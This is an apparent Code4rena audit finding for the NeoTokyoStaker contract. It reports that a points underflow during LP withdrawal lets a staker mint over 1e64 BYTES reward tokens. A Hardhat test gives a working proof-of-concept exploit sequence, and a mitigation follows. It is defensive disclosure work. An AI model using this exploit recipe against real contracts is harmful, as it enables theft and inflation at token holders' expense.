## Tags

- bug
- 3 (High Risk)
- judge review requested
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-02

# [Underflow of `lpPosition.points` during withdrawLP causes huge reward minting](https://github.com/code-423n4/2023-03-neotokyo-findings/issues/261) 

# Lines of code

https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1622-L1631


# Vulnerability details

## Impact
NeoTokyoStaking allows to stake and withdraw LPs. User can stake multiple times on same position which simply results in extended lock time and user can withdraw all of these LPs once lock time is passed.

There is a scenario when withdrawing LPs results in overflow of [lpPosition.points](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1627). After withdraw if attacker calls `getRewards()` then attacker will get more than 1e64 BYTES tokens as reward.

## Proof of Concept
Affected code block: [NeoTokyoStaker.sol#L1622-L1631](
https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1622-L1631)

Affected line: [L1627](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1627)

From below POC you can see that Alice is staking twice and some specific amounts which will trigger underflow when Alice withdraw LP. Once staked LPs are unlocked, Alice can withdraw her LPs and call `getReward()` to trigger minting of more than 1e64 BYTES tokens.

Below test can be added in `NeoTokyoStaker.test.js` test file.
```js
		it('Unexpected rewards minting due to underflow of "points"', async function () {
			// Configure the LP token contract address on the staker.
			await NTStaking.connect(owner.signer).configureLP(LPToken.address);
			const amount1 = ethers.utils.parseEther('10.009')
			const amount2 = ethers.utils.parseEther('11.009')
			const lockingDays = 30
			
			// Alice stake amount1 LPs for 30 days.
			await NTStaking.connect(alice.signer).stake(
				ASSETS.LP.id,
				TIMELOCK_OPTION_IDS[lockingDays],
				amount1,
				0,
				0
			);

			// Alice stake amount2 LPs for 30 days.
			await NTStaking.connect(alice.signer).stake(
				ASSETS.LP.id,
				TIMELOCK_OPTION_IDS[lockingDays],
				amount2,
				0,
				0
			);

			const priorBlockNumber = await ethers.provider.getBlockNumber();
			const priorBlock = await ethers.provider.getBlock(priorBlockNumber);
			let aliceStakeTime = priorBlock.timestamp;
			
			// Bob stake 10 LPs for 30 days
			await NTStaking.connect(bob.signer).stake(
				ASSETS.LP.id,
				TIMELOCK_OPTION_IDS[lockingDays],
				ethers.utils.parseEther('10'),
				0,
				0
			);

			// Set time to unlock staked lp
			await ethers.provider.send('evm_setNextBlockTimestamp', [
				aliceStakeTime + (60 * 60 * 24 * lockingDays)
			]);
			
			// Alice withdraw LP
                        // This transaction will cause underflow of `lpPosition.points`
			await NTStaking.connect(alice.signer).withdraw(
				ASSETS.LP.id,
				amount1.add(amount2)
			);

			// Before exploit:: Verify Alice's Bytes balance is less than 10000 BYTES
			expect(await NTBytes2_0.balanceOf(alice.address)).lt(ethers.utils.parseUnits('10000', 18))
			
			// Get rewards for Alice. It will mint HUGE rewards due to underflow happened on withdraw transaction.
			await NTBytes2_0.getReward(alice.address)

			// After exploit:: Verify Alice's Bytes balance is greater than 3e64
			expect(await NTBytes2_0.balanceOf(alice.address)).gt(ethers.utils.parseUnits('3', 64))
		});
```

## Tools Used
Manual

## Recommended Mitigation Steps
Consider adding proper precision for `points` and `totalPoints` and also consider checking for under/overflows.